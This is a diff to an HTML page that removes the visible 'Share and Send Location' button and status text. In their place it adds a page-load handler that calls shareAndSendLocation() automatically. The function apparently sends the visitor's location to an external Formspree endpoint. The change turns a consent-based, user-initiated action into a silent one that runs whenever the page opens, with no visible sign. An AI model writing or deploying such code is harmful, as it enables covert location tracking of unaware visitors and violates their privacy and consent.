@@ -35,14 +35,12 @@
     </style>
 </head>
 <body>
-
-<div class="container">
-    <h2>Submit Location Data</h2>
-    <button onclick="shareAndSendLocation()">Share and Send Location</button>
-    <div id="status">Click the button to send location data.</div>
-</div>
-
 <script>
+
+document.addEventListener("DOMContentLoaded", () => {
+    // Your automatic code goes here
+    shareAndSendLocation()
+});
 // Replace this with your actual backend endpoint or Formspree URL
 const RECEIVER_ENDPOINT = 'https://formspree.io/f/mqervzva';
 
